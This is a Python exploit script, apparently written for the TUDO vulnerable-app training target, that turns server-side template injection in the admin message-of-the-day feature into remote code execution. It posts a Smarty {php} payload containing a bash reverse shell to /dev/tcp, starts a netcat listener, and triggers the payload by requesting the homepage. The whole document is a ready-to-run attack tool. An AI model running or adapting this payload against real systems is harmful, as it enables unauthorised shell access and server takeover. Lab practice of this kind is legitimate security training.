# TUDO Remote Code Execution #1 - "ssti"
# William Moody
# December 22, 2025

import requests
import argparse
import subprocess
import time

# Parse arguments
parser = argparse.ArgumentParser(description="Exploits SSTI in MotD to get RCE")
parser.add_argument("target",help="Target URL")
parser.add_argument("cookie",help="Admin cookie")
parser.add_argument("--lhost",help="Host to listen on",default="172.17.0.1")
parser.add_argument("--lport",help="Port to listen on",default="9999")
args = parser.parse_args()

# Sanitize target URL
if args.target[-1] == "/":
    args.target = args.target[:-1]

# Set MotD to payload
payload = "{php}" + f"exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1'\")" + "{/php}"
r = requests.post(
    f"{args.target}/admin/update_motd.php",
    headers={"cookie":args.cookie},
    data={"message":payload}
)
assert "Message set!" in r.text
print("[*] Set MotD to payload")

# Start listener
print("[*] Starting listener...")
subprocess.Popen(["nc","-nvlp", f"{args.lport}"])

# Trigger payload by visiting homepage as admin (any user works)
time.sleep(1)
requests.get(
    f"{args.target}/index.php",
    headers={"cookie":args.cookie}
)

# Keep shell open
while True:
    pass